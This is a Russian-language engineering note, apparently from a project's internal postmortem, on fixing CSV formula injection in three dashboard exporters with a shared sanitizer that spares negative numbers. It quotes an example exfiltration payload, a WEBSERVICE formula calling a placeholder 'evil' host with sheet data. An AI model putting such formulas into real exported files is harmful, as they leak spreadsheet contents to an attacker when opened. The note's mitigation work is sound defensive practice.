...
## Проблема 7: CSV formula injection (CWE-1236 / OWASP "CSV Injection")

### Симптом
Экспорт детализации в CSV (`DetailModal.tsx` → `exportToCsv`) брал сырые
значения dimension-колонок (`group.name`, `child.name` — это GROUP BY значения
из `api/v1/chart/data`, т.е. текст из хранилища) и оборачивал их только в
RFC-4180 кавычки. Если значение начинается с `=`, `+`, `-`, `@` или TAB/CR,
Excel / LibreOffice / Google Sheets трактуют ячейку как **формулу**. Метка вида
`=WEBSERVICE("http://evil/?x="&A1)` при открытии файла выполняется и
эксфильтрует данные листа.

### Почему кавычки не спасают
Удвоение кавычек (`"` → `""`) — это RFC-4180 экранирование для разделителей,
оно ортогонально formula injection. Excel при импорте **снимает** CSV-кавычки и
всё равно видит ведущий `=`: `"=cmd"` → ячейка `=cmd` → формула выполняется.

### Решение
Канонический helper `_shared/csv-escape/sanitizeCsvCell.ts`: если ячейка
начинается с `= + - @` / TAB / CR / LF — префиксуем одинарной кавычкой (`'`),
Excel трактует содержимое как текст (стандартная OWASP-митигация). Вызывается
**до** кавычек-обёртки во всех escaper'ах.

### Тонкость: отрицательные числа
Ведущий `-` тоже триггерит формулу, но с него же начинаются отрицательные числа
(дельты: `-1234`, ru-формат `-3,50`, `-1 234,5`). Тупой префикс на любой `-`
превратил бы числа в текст и сломал SUM/AVG в открытом листе. Поэтому helper
**исключает** plain-числа (en `.` и ru `,` десятичные, пробел/NBSP разряды,
fraction-only `.5` / `,5`) — `[+-]` нейтрализуется только если ячейка не
является валидным числом. Payload `-1+WEBSERVICE(...)` всё равно ловится (после
`-1` идёт не число) → это true no-op на числах, а не визуальный.

### Охват
Та же уязвимость была во всех трёх CSV-экспортёрах проекта — пофикшено единым
shared helper'ом:
- `scorecard/src/DetailModal.tsx` (`escape`)
- `divergingBars/src/VelocityDiverging.tsx` (`esc`)
- `leaderboard/src/utils/csvExport.ts` (`esc`)

Тест: `scorecard/test/sanitizeCsvCell.test.ts` (7 кейсов; scorecard —
единственный плагин с рабочим jest, а helper байт-идентичен везде, так что одного
набора достаточно). Sync-команда копий — в корневом `CLAUDE.md`.

### Урок
RFC-4180 экранирование ≠ защита от formula injection. Любой экспорт сырого
текста из хранилища в CSV обязан нейтрализовать formula-префиксы — но не ценой
порчи числовых колонок.
